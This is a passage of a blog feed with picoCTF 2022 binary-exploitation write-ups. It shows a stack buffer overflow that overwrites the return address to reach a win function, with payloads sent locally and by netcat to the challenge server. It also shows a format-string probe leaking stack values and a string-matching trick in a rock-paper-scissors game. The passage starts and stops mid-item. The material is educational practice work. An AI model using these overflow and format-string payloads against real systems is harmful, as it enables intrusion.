<p>You can view source <a href="https://artifacts.picoctf.net/c/250/vuln.c" target="_blank" rel="noopener noreferrer">here</a>. And connect with it using</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nc saturn.picoctf.net 50916</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="preface">Preface<a href="https://kbbgl.github.io/blog/pico_2022/binary_exploitation/buffer_overflow_1/README#preface" class="hash-link" aria-label="Direct link to Preface" title="Direct link to Preface">​</a></h2>
<p>Reading the source code, we needed to ensure that we have a flag locally that we use to debug:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo "picoCTF{some_flag}" &gt; flag.txt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="exploitation">Exploitation<a href="https://kbbgl.github.io/blog/pico_2022/binary_exploitation/buffer_overflow_1/README#exploitation" class="hash-link" aria-label="Direct link to Exploitation" title="Direct link to Exploitation">​</a></h2>
<p>Sent 50 <code>U</code> as payload, we can see that the return address was overwritten:</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">(gdb) r</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Starting program: vuln </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Please enter your string: </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Breakpoint 1, 0x080492a3 in vuln ()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(gdb) c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Continuing.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Okay, time to return... Fingers Crossed... Jumping to 0x55555555</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Program received signal SIGSEGV, Segmentation fault.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x55555555 in ?? ()</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Trying again with 44 <code>U</code> and <code>1234</code>, we can see that we now control the return address:</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">(gdb) r</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The program being debugged has been started already.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Start it from the beginning? (y or n) y</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Starting program: vuln </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Please enter your string: </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU1234</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Breakpoint 1, 0x080492a3 in vuln ()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(gdb) c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Continuing.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Okay, time to return... Fingers Crossed... Jumping to 0x34333231</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Program received signal SIGSEGV, Segmentation fault.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x34333231 in ?? ()</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="finding-the-return-address">Finding the Return Address<a href="https://kbbgl.github.io/blog/pico_2022/binary_exploitation/buffer_overflow_1/README#finding-the-return-address" class="hash-link" aria-label="Direct link to Finding the Return Address" title="Direct link to Finding the Return Address">​</a></h2>
<p>To find the return address, we need to look at where at the address where the <code>win</code> function starts since we want the program to jump there when it finishes executing the <code>vuln</code> function:</p>
<p>Converting the calling address of the <code>win</code> function together with the fuzzing, we're able to get the flag:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">printf "UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU\xf6\x91\x04\x08" | ./vuln</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Please enter your string: </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Okay, time to return... Fingers Crossed... Jumping to 0x80491f6</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">picoCTF{some_flag}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[1]    57020 done                              printf "UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU\xf6\x91\x04\x08" | </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">       57021 segmentation fault (core dumped)  ./vuln</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>To get the flag from the remote server:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cat &lt;(printf "UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU\xf6\x91\x04\x08") - | nc saturn.picoctf.net 58677</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Please enter your string: </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Okay, time to return... Fingers Crossed... Jumping to 0x80491f6</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">picoCTF{addr3ss3s_ar3_3asy_ad2f467b}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[flag_leak]]></title>
            <link>https://kbbgl.github.io/blog/pico_2022/binary_exploitation/flag_leak/README</link>
            <guid>https://kbbgl.github.io/blog/pico_2022/binary_exploitation/flag_leak/README</guid>
            <pubDate>Thu, 26 Sep 2024 20:59:28 GMT</pubDate>
            <description><![CDATA[Description]]></description>
            <content:encoded><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="description">Description<a href="https://kbbgl.github.io/blog/pico_2022/binary_exploitation/flag_leak/README#description" class="hash-link" aria-label="Direct link to Description" title="Direct link to Description">​</a></h2>
<p>Story telling class 1/2.</p>
<p>I'm just copying and pasting with <a href="https://artifacts.picoctf.net/c/122/vuln" target="_blank" rel="noopener noreferrer">this program</a>. What can go wrong?</p>
<p>You can view <a href="https://artifacts.picoctf.net/c/122/vuln.c" target="_blank" rel="noopener noreferrer">source here</a>. And connect with it using:</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nc saturn.picoctf.net 57802</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="exploitation">Exploitation<a href="https://kbbgl.github.io/blog/pico_2022/binary_exploitation/flag_leak/README#exploitation" class="hash-link" aria-label="Direct link to Exploitation" title="Direct link to Exploitation">​</a></h2>
<p>If we send format strings into the program <code>stdin</code>, we see that the <code>AAAA</code> show up in the 15th parameter on the stack:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">❯ python3 -c "print('AAAA' + 4 * '.%x.%x.%x.%x')" |  ./vuln</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Tell me a story and then I'll tell you one &gt;&gt; Here's a story - </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">AAAA.f7fa8723.0.f7ec90a7.12.7c.6f636970.656d6f73.a7d67.0.0.0.0.0.41414141.252e7825.2e78252e</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python3 -c "print('AAAA' + 4 * '.%x.%x.%x.%x')" |  ./vuln | cut -d"." -f15</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Tell me a story and then I'll tell you one &gt;&gt; Here's a story - </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">41414141</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Buffer Overflow 3]]></title>
            <link>https://kbbgl.github.io/blog/pico_2022/binary_exploitation/buffer_overflow_3/README</link>
            <guid>https://kbbgl.github.io/blog/pico_2022/binary_exploitation/buffer_overflow_3/README</guid>
            <pubDate>Thu, 26 Sep 2024 20:59:28 GMT</pubDate>
            <description><![CDATA[Description]]></description>
            <content:encoded><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="description">Description<a href="https://kbbgl.github.io/blog/pico_2022/binary_exploitation/buffer_overflow_3/README#description" class="hash-link" aria-label="Direct link to Description" title="Direct link to Description">​</a></h2>
<p>Do you think you can bypass the protection and get the flag?</p>
<p>It looks like Dr. Oswal added a stack canary to <a href="https://artifacts.picoctf.net/c/492/vuln" target="_blank" rel="noopener noreferrer">this program</a> to protect against buffer overflows.</p>
<p>You can view <a href="https://artifacts.picoctf.net/c/492/vuln.c" target="_blank" rel="noopener noreferrer">source here</a>.</p>
<p>And connect with it using:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nc saturn.picoctf.net 57427</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><a href="https://www.youtube.com/watch?v=0KVtyDQHWm0" target="_blank" rel="noopener noreferrer">https://www.youtube.com/watch?v=0KVtyDQHWm0</a></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="research">Research<a href="https://kbbgl.github.io/blog/pico_2022/binary_exploitation/buffer_overflow_3/README#research" class="hash-link" aria-label="Direct link to Research" title="Direct link to Research">​</a></h2>
<p>There's no validation whether <code>length</code> variable is supposed to be an integer or not so we can insert any string that is 64 characters long.</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">define</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property macro-name" style="color:#36acaa">BUFSIZE</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property expression number" style="color:#36acaa">64</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> length</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">BUFSIZE</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"How Many Bytes will You Write Into the Buffer?\n&gt; "</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token keyword" style="color:#00009f">while</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">x</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">BUFSIZE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token function" style="color:#d73a49">read</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">length</span><span class="token operator" style="color:#393A34">+</span><span class="token plain">x</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">length</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">x</span><span class="token punctuation" style="color:#393A34">]</span><span class="token operator" style="color:#393A34">==</span><span class="token char">'\n'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">break</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      x</span><span class="token operator" style="color:#393A34">++</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token function" style="color:#d73a49">sscanf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">length</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">"%d"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">count</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[RPS]]></title>
            <link>https://kbbgl.github.io/blog/pico_2022/binary_exploitation/rps/README</link>
            <guid>https://kbbgl.github.io/blog/pico_2022/binary_exploitation/rps/README</guid>
            <pubDate>Thu, 26 Sep 2024 20:59:28 GMT</pubDate>
            <description><![CDATA[Description]]></description>
            <content:encoded><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="description">Description<a href="https://kbbgl.github.io/blog/pico_2022/binary_exploitation/rps/README#description" class="hash-link" aria-label="Direct link to Description" title="Direct link to Description">​</a></h2>
<p>Here's a program that plays rock, paper, scissors against you. I hear something good happens if you win 5 times in a row.</p>
<p>Connect to the program with netcat:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nc saturn.picoctf.net 51420</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The program's source code with the flag redacted can be downloaded <a href="https://artifacts.picoctf.net/c/442/game-redacted.c" target="_blank" rel="noopener noreferrer">here</a>.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="exploit">Exploit<a href="https://kbbgl.github.io/blog/pico_2022/binary_exploitation/rps/README#exploit" class="hash-link" aria-label="Direct link to Exploit" title="Direct link to Exploit">​</a></h2>
<p>The exploit to this program can be explained by looking at this condition:</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> player_turn</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">100</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">//..</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> r </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">tgetinput</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">player_turn</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">100</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">//..</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> computer_turn </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">rand</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">%</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">//..</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">strstr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">player_turn</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> loses</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">computer_turn</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic">//..</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>What <code>strstr</code> does is look for the first occurrence of the result of <code>loses[computer_turn]</code> inside <code>player_turn</code>.</p>
<p><code>computer_turn</code> is a random number between 0 and 2.</p>
<p>But <code>player_turn</code> is our input.</p>
<p>So we can basically pass the following string into the program to ensure that there will always be a match in the condition:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Please make your selection (rock/paper/scissors):</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rockpaperscissors</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">You played: rockpaperscissors</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The computer played: scissors</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">You win! Play again?</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Type '1' to play a game</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Type '2' to exit the 